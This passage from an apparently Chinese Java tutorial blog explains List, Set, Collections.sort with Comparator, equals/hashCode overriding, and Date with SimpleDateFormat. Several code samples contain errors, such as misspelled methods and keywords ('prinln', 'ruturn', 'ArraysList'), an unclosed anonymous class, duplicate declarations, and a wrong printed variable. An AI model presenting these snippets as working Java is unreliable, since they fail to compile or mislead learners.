提供的一个新特性。该循环**不通用**与其他传统循环，一般只用于遍历集合或数组。语法：<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span> <span class="token punctuation">(</span>元素数据类型 变量名 <span class="token operator">:</span> 集合或数组<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//循环体</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>编译器在执行以上代码时，会将以上代码替换成迭代器去执行。（增强 for 循环本质上就是迭代器。）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//自动拆装箱</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,2,3,4,5,6,7,8,9,10]</span><span class="token comment">//使用迭代器遍历</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span> i <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">prinln</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## List ##List 是一个**接口**，是 Collection 的子接口。可以将 List 理解成存放对象的数组，只不过元素个数不固定。List 接口常见的两个实现类：ArrayList，LinkedList分别用动态数组实现和双向链表实现。<ul><li>ArrayList：底层采用数组方式实现，可以通过下标来访问元素，并且下标从 0 开始，更适合用于随即访问（查询），但插入和删除性能稍慢。</li><li>LinkedList：底层采用双向链表实现，更适合于插入和删除，随机访问速度较慢，在性能要求不是特别苛刻的情况下，可以忽略。</li></ul><br>### List 特有的方法List 除了继承 Collection 定义的方法之外，还定义了自己特有的方法。它**可以通过下标来操作元素**（Set 不可以）<p>**get(int index)**：返回集合中指定下标的元素。返回值为泛型。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"list 的第二个元素是："</span> <span class="token operator">+</span> list<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>**set(int index, E element)**：将给定的元素存入到集合中指定位置，并将原位置的元素返回。返回值为泛型。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> x <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将第三个元素值设置为 5，并返回原先第三个元素的值，x = 3</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,2,5,4]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>**add(int index, E element)**：将给定的元素插入到指定位置，原位置及后续元素后移。**无返回值**。<pre class="line-numbers language-java" data-language="java"><code class="language-java">list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在第二个位置添加元素 7</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,7,2,5,4]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>**remove(index)**：删除集合中指定位置的元素，并返回该元素。返回值为泛型。<pre class="line-numbers language-java" data-language="java"><code class="language-java">x <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除集合中第三个元素，并将该元素返回 x = 2</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,7,5,4]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>**subList(int startIndex, int endIndex)**：获取指定范围(含头不含尾)的子集合，返回该子集合。返回值为 List<e><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> subList <span class="token operator">=</span> list<span class="token punctuation">.</span><span class="token function">subList</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>subList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [7,5]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p><strong>子集的修改会影响父集</strong></p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">subList<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>subList<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>subList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [7,50]</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>subList<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 [1,7,50,4]，父集合的元素也被修改了</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>### List 排序Collection**s** 是集合的工具类，它提供了很多便于操作集合的方法，其中就有静态方法 sort() 方法进行排序，**仅能对 List 排序**。<p>**void sort(List<t> list)**方法对给定的集合元素进行自然排序（从小到大），无返回值。</t></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Random</span> r <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"排序之前\n"</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"排序之后\n"</span> <span class="token operator">+</span> list<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>字符串也可以排序（默认按照 ascii 码进行排序）</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> strlist <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArraysList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"猴"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"鼠"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"牛"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"马"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"猪"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"狗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>strlist<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"你"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"排序之前\n"</span> <span class="token operator">+</span> strlist<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>strlist<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"排序之后\n"</span> <span class="token operator">+</span> strlist<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>#### Comparator 比较器在实际开发中，往往需要自定义排序规则，需要自定义排序规则时，可以采用实现 Comparator **接口**来自定义排序规则。<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//该 sort 方法支持一个重载方法，传入一个自定义比较器</span><span class="token class-name">Mycomparator</span> com <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyComparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> com<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Collections.sort(list, new MyComparator());//这样也可以</span><span class="token comment">//按照字符串长度排序</span><span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span>strlist<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//复习下匿名内部类...</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">String</span> o1<span class="token punctuation">,</span> <span class="token class-name">String</span> o2<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> o1<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> o2<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>自定义倒序排列比较器</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> <span class="token class-name">MyComparator</span> <span class="token keyword">implements</span> <span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span><span class="token comment">/*** 重写父类具体比较方法* 若 o1 &gt; o2 则返回值&lt;0* 若 o1 &lt; o2 则返回值&gt;0* 若 o1 = o2 则返回至为 0*/</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> o1<span class="token punctuation">,</span> <span class="token class-name">Integer</span> o2<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> o2 <span class="token operator">-</span> o1<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## Set ##Set 也是一个接口，是 Collection 的子接口。不包含重复元素，存入和取出的顺序不一致，Set 最多只包含一个 null。Set 接口有两个实现类：HashSet 和 TreeSet。<ul><li>HashSet：底层采用 Hash 表数据结构，HashSet 是通过元素的 HashCode 值相同，才会判断 equlas 是否为 true。若 HashCode 值不同，则不会调用 equals 进行判断。</li><li>TreeSet：底层采用 二叉树算法，TreeSet 存储对象时，可以进行排序，但需要指定排序算法，依赖 complareTo 方法。</li></ul><blockquote><p>自定义的类需要重写 toString 和 equals 方法。<br>如果<strong>重写 equals 方法，一定要重写 [HashCode](/2017/03/19/HashCode 散列码/#散列函数) 方法</strong>。<br>equals 与 hashCode 的定义必须一致：如果 x.queals(y) 返回 true，那么 x.hashCode 就必须与 y.hashCode() 具有相同的值。</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//自定义一个 Point 类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Point</span> <span class="token punctuation">{</span><span class="token keyword">int</span> x<span class="token punctuation">;</span><span class="token keyword">int</span> y<span class="token punctuation">;</span><span class="token comment">//无参构造器</span><span class="token keyword">public</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment">//有参构造器</span><span class="token keyword">public</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//重写 toString() 方法</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">"["</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">","</span> <span class="token operator">+</span> y <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//重写 equals() 方法</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Point</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token class-name">Point</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Point</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">.</span>x <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">&amp;&amp;</span> p<span class="token punctuation">.</span>y <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span><span class="token punctuation">}</span>ruturn <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//重写 hashCode() 方法</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">final</span> <span class="token keyword">int</span> prime <span class="token operator">=</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>result <span class="token operator">=</span> prime <span class="token operator">*</span> result <span class="token operator">+</span> x<span class="token punctuation">;</span>result <span class="token operator">=</span> prime <span class="token operator">*</span> result <span class="token operator">+</span> y<span class="token punctuation">;</span><span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>测试类中使用：</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">&gt;</span></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Point</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Point</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>set<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></e>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 集合 </tag>
            
            <tag> Set </tag>
            
            <tag> Collection </tag>
            
            <tag> List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日期类</title>
      <link href="/2017/03/16/ri-qi-lei/"/>
      <url>/2017/03/16/ri-qi-lei/</url>
      
        <content type="html"><![CDATA[<p>在编程中，经常需要对日期和时间进行操作，这篇文章就介绍下常用的日期操作方法及其相关的类。</p><span id="more"></span><h2 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h2><p>Java 中的时间是通过 Date 表示，是表示距离 「1970/01/01 00:00:00」 的毫秒数，java.util.Date 类封装了日期及时间信息。</p><blockquote><p>Date 类中的大多数进行时间计算的方法都已经被 <a href="/2017/03/16/%E6%97%A5%E6%9C%9F%E7%B1%BB/#Calendar">Calendar</a> 取代。</p></blockquote><p>Date 的三个常用方法：一个构造方法 Date()，和两个(幸存下来的方法，哈哈)方法 getTime() 和 setTime()。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建对象并获取当前时间</span><span class="token comment">//获取自 1970 01 01 00:00:00 到 date 时间(这里为当前时间)的毫秒数</span><span class="token keyword">long</span> time <span class="token operator">=</span> date<span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置明天此时此刻的日期和时间。</span>time <span class="token operator">+=</span> <span class="token number">24</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">60</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">;</span>date<span class="token punctuation">.</span><span class="token function">setTime</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置时间</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出类似 Sun Mar 18 18:17:25 CST 2017 的时间</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>## SimplaDateFormat ##由于 Date 输出的时间格式并不是很容易看懂，所以这时候可以使用 SimplaDateFormat。java.text.SimpleDateFormat 是一个用来格式化话解析日期的类，允许我们按照一个指定的日期格式，在 String 与 Date 类型之间互换：<ul><li>**format(Date date)**：将 Date 类型转换为 String 类型，返回值为 String 类型。</li><li>**Date parse(String str)**：将 String 类型的时间转换为 Date 类型，返回值为 Date 类型。</li></ul><p><strong>转换前提是需要指定格式，日期模式匹配字符：</strong></p><table><thead><tr><th align="center">字符</th><th align="center">含义</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">y</td><td align="center">年</td><td align="center">yyyy → 2017 或 yy → 17</td></tr><tr><td align="center">M</td><td align="center">月</td><td align="center">MM → 03 或 M → 3</td></tr><tr><td align="center">d</td><td align="center">日</td><td align="center">dd → 16</td></tr><tr><td align="center">m</td><td align="center">分</td><td align="center">mm → 37</td></tr><tr><td align="center">s</td><td align="center">秒</td><td align="center">ss → 59</td></tr><tr><td align="center">a</td><td align="center">AM 或 PM</td><td align="center"></td></tr><tr><td align="center">H</td><td align="center">时(24)</td><td align="center">HH:mm:ss → 12:24:39</td></tr><tr><td align="center">h</td><td align="center">时(12)</td><td align="center">hh:mm:ss → 9:47:49</td></tr></tbody></table><p>将 Date 转换为 String 类型示例：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Date</span> now <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前时间</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 Sat Mar 16 18:27:13 CST 2017</span><span class="token comment">//将 Date 类型的数据按照指定格式转换为 String 类型的数据</span><span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sdf<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2017-03-16 18:27:13</span><span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yyyy/MM/dd HH.mm.ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sdf<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 2017/03/18 18.27.13</span><span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"yy-MM/dd hh:mm.ss"</span><span 